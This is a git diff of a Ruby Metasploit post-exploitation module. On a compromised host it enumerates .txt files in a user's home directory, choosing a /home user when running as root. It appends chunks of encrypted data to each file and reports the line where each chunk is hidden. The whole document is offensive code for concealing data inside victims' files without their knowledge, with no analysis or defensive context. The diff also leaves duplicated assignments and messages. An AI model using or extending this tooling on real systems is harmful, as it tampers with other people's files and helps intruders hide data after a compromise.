@@ -66,8 +66,15 @@ class MetasploitModule < Msf::Post
 
         # Get list of .txt files on remote machine in '~' directory
         currentUser = get_env('USER')
+        if currentUser.include? "root"
+            currentUser = dir("/home")[0]
+        end
+
+        print_good("As User:_> #{currentUser}")
+        allFiles = dir("/home/#{currentUser}")
+
         print_good("Current User set to:_> #{currentUser}")
-        print_good("Searching files in:_> /home/kali")
+        print_good("Searching files in:_> /home/#{currentUser}")
         allFiles    = dir("/home/#{currentUser}")
         print_good("Files found:_> #{allFiles}")
 
@@ -76,6 +83,7 @@ class MetasploitModule < Msf::Post
         allFiles.each {
             |file|
             if file.include? ".txt"
+                print_good("Found .txt file:_> #{file}")
                 textFiles.append(file)
             end
         }
@@ -86,8 +94,11 @@ class MetasploitModule < Msf::Post
 
         textFiles.each {
             |file|
+            print_good("Appending to file:_> #{file}")
+            fileLines = read_file(file)
+            fileLines = fileLines.split("\n")
             append_file(file, encryptedData[indexStart..indexEnd])
-            whisper.setWhisperLocation(file, (textFiles.size + 1))
+            whisper.setWhisperLocation(file, (fileLines.size + 1))
 
             indexStart = indexEnd
             indexEnd  += indexStep
@@ -95,7 +106,8 @@ class MetasploitModule < Msf::Post
 
         textFiles.each {
             |file|
-            print_good(whisper.getWhisperLocation(file))
+            location = whisper.getWhisperLocation(file)
+            print_good("Whispered in #{file} on line #{location}")
         }
     end
 end
